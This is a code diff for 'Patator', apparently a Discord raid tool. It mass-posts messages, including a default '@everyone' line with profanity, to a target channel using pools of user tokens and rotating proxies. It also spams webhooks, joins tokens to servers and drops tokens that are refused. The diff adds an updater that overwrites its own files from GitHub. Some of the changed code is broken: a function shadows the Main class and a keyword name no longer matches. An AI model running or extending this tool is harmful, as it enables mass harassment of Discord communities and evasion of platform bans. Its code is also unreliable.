@@ -1,7 +1,21 @@
 import requests, random, os, json, fake_useragent
+from update_check import update, isUpToDate
 from colorama import Fore, Style, init
 from threading import Thread
 init()
+
+class Update():
+    def __init__(self):
+        self.Update_files = {
+            './README.md': 'https://raw.githubusercontent.com/Its-Vichy/Patator/main/README.md',
+            './Patator.py': 'https://raw.githubusercontent.com/Its-Vichy/Patator/main/Patator.py',
+            './Config/Config.json': 'https://raw.githubusercontent.com/Its-Vichy/Patator/main/Config/Config.json'
+        }
+
+    def Update(self):
+        for files, url in self.Update_files.items():
+            if isUpToDate(files, url) == False:
+                update(files, url)
 
 class Console():
     def __init__(self, title = 'github.com/its-vichy'):
@@ -42,13 +56,16 @@ class Proxy():
         return UserAgent().random
 
     def load_proxy(self):
+        Duplicate = 0
         with open(self.proxy_file, 'r+') as proxy_files:
             for proxy in proxy_files:
                 proxy = proxy.split('\n')[0]
                 if proxy not in self.proxy_list:
                     self.proxy_list.append(proxy)
+                else:
+                    Duplicate += 1
         
-        self.console.printer('*', f'{self.get_proxy_number()} proxies was load from {self.proxy_file} file', color= Fore.MAGENTA)
+        self.console.printer('*', f'{self.get_proxy_number()} proxies was load from {self.proxy_file} file, {Duplicate} duplicate proxies was removed', color= Fore.MAGENTA)
 
     def scrape_proxy(self):
         before_number = self.get_proxy_number()
@@ -75,10 +92,10 @@ class Proxy():
                             self.proxy_list.append(Proxy)
                             unknow += 1
                         elif Type == 'Http':
-                            self.proxy_list.append(Proxy)
+                            self.proxy_list.append(f'http://{Proxy}')
                             http += 1
                         elif Type == 'Https':
-                            self.proxy_list.append(Proxy)
+                            self.proxy_list.append(f'https://{Proxy}')
                             http_s += 1
                         elif Type == 'Socks4':
                             self.proxy_list.append(f'socks4://{Proxy}')
@@ -153,18 +170,23 @@ class Spammer():
             except requests.exceptions.Timeout:
                 pass
 
-    def spam_token(self, channel, messsage):
+    def spam_token(self, channel, message):
+        if message == '':
+            message = '> ||@everyone|| **Fucked by Patator.**'
         while True:
             try:
                 token = random.choice(self.token_list)
                 raw, proxy = self.proxy_manager.get_random_proxy()
                 
-                Resp = requests.post(f'https://discord.com/api/v8/channels/{channel}/messages', headers= {'authorization': token.strip(), 'user-agent': self.proxy_manager.get_user_agent(), 'content-type': 'application/json'}, data= json.dumps({'content': messsage}), proxies=dict(proxy), timeout= 3500).status_code
+                Resp = requests.post(f'https://discord.com/api/v8/channels/{channel}/messages', headers= {'authorization': token, 'user-agent': self.proxy_manager.get_user_agent(), 'content-type': 'application/json'}, data= json.dumps({'content': message}), proxies=dict(proxy), timeout= 3500).status_code
 
                 if Resp == 200:
                     self.console.printer('+', f'Message sent with {raw}', ' !', Fore.GREEN)
                 elif Resp == 429:
                     self.console.printer('~', f'Rate limited with {raw}', ' :(', Fore.YELLOW)
+                elif Resp == 403:
+                    self.console.printer('~', f'Token not in server, removing from the list', ' #', Fore.YELLOW)
+                    self.token_list.remove(token)
                 else:
                     self.console.printer('!', f'CloudFare banned with proxy {raw}', ' !', Fore.RED)
 
@@ -235,7 +257,7 @@ class Spammer():
             Threads.start()
 
 class Main():
-    def __init__(self, user_token, webhook_threads, spammer_threads, joiner_threads):
+    def __init__(self, scrape_proxies, user_token, webhook_threads, spammer_threads, joiner_threads):
         self.webhook_threads = webhook_threads
         self.spammer_threads = spammer_threads
         self.joiner_threads  = joiner_threads
@@ -255,14 +277,19 @@ class Main():
         while True:
             Resp = int(self.console.printer('?', 'Choose an option', color= Fore.YELLOW, Isinput= True))
             
+            # Spam webhook
             if Resp == 1:
                 self.console.printer('*', f'Starting webhook spammer with {self.webhook_threads} thread(s)', color= Fore.MAGENTA)
                 self.spammer.start_spammer(self.webhook_threads, Resp)
+            
+            # Token spammer
             elif Resp == 2:
                 channel_id = self.console.printer('?', f'Target channel ID', color= Fore.YELLOW, Isinput= True)
                 message = self.console.printer('?', f'Message to sent (can skip)', color= Fore.YELLOW, Isinput= True)
                 self.console.printer('*', f'Starting channel spammer with {self.spammer_threads} thread(s)', color= Fore.MAGENTA)
                 self.spammer.start_spammer(self.spammer_threads, Resp, channel= channel_id, messsage= message)
+            
+            # Token joiner
             elif Resp == 3:
                 discord_invite = self.console.printer('?', f'Discord server invite', color= Fore.YELLOW, Isinput= True)
 
@@ -272,9 +299,16 @@ class Main():
                 self.console.printer('*', f'Starting joining with discord.gg/{discord_invite} with {self.joiner_threads} thread(s)', color= Fore.MAGENTA)
                 self.spammer.start_spammer(self.joiner_threads, Resp, invite_code=discord_invite)
 
-with open('./Config/Config.json', 'r+') as config_file:
-    config = json.load(config_file)
+def Main():
+    Installer = Update()
+    Installer.Update()
 
-    Tool = Main(config['Token'], config['WebhoockThreads'], config['SpammerThreads'], config['JoinerThreads'])
-    Tool.initialize()
-    Tool.Parser()
+    with open('./Config/Config.json', 'r+') as config_file:
+        config = json.load(config_file)
+
+        Tool = Main(config['ScrapeProxies'], config['Token'], config['WebhoockThreads'], config['SpammerThreads'], config['JoinerThreads'])
+        Tool.initialize()
+        Tool.Parser()
+
+if __name__ == '__main__':
+    Main()
